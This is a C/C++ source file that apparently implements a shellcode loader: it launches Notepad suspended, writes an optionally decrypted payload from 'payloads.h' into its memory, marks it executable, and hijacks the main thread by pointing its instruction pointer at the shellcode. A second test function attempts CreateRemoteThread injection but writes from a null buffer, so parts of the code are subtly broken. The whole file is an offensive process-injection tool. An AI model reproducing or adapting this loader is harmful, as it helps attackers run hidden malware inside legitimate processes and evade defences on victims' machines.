

#include "payloads.h"
#pragma warning (disable:4996)

// ---------------------------------------------------------
// Main Test Harness
// ---------------------------------------------------------


void payload_test() {


	PROCESS_INFORMATION pi;
	STARTUPINFOEXW si;
	SIZE_T attributeSize;
	LPVOID allocatedMemory = NULL;
	WCHAR path[MAX_PATH];
	SIZE_T written = 0;

	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	

	lstrcpyW(path, L"C:\\windows\\SYSWOW64\\notepad.exe");

	CreateProcessW(NULL, path, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	Sleep(1000);

	unsigned char* newBuff = nullptr;

	allocatedMemory = VirtualAllocEx(pi.hProcess, NULL,511, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(pi.hProcess, allocatedMemory, newBuff, 511, &written);

	CreateRemoteThread(pi.hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, NULL, NULL);

	ResumeThread(pi.hThread);


	free(newBuff);
}

BOOL CreateSuspendedProcessWithRemoteThread(IN LPCSTR lpProcessName) {

	CHAR					lpPath[MAX_PATH * 2];
	CHAR					WnDr[MAX_PATH];

	STARTUPINFO				Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };
	int sSizeOfShellcode;

	// Cleaning the structs by setting the member values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the value of the %WINDIR% environment variable (this is usually 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the full target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(
		NULL,					// No module name (use command line)
		lpPath,					// Command line
		NULL,					// Process handle not inheritable
		NULL,					// Thread handle not inheritable
		FALSE,					// Set handle inheritance to FALSE
		CREATE_SUSPENDED,		// creation flags	
		NULL,					// Use parent's environment block
		NULL,					// Use parent's starting directory 
		(LPSTARTUPINFOA)&Si,					// Pointer to STARTUPINFO structure
		&Pi)) {					// Pointer to PROCESS_INFORMATION structure

		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	// Populating the OUT parameters with CreateProcessA's output
	auto dwProcessId = Pi.dwProcessId;
	auto hProcess = Pi.hProcess;
	auto hThread = Pi.hThread;


	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;

	/// Inject payload
	//Decrypt Payload
	PBYTE pShellcode = nullptr;
	
	if (ENCODING) {
		sSizeOfShellcode = UtilDecryptFileQuoted(buf, sizeof(buf), &pShellcode);
	}
	else
	{
		pShellcode = buf;
		sSizeOfShellcode = sizeof(buf);
		
	}

	LPVOID pAddress = nullptr;
	pAddress = VirtualAllocEx(hProcess, NULL, sizeof(pShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\n\t[i] Allocated Memory At : 0x%p \n", pAddress);


	if (!WriteProcessMemory(hProcess, pAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);


	if (!VirtualProtectEx(hProcess, pAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	//Resume thread

	CONTEXT		ThreadCtx;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_CONTROL;

	// getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// updating the next instruction pointer to be equal to our shellcode's address 
	ThreadCtx.Rip =(DWORD64) pAddress;

	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	// resuming suspended thread, thus running our payload
	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}


int main() {

	
	CreateSuspendedProcessWithRemoteThread("Notepad.exe");
    

    return 0;
   
}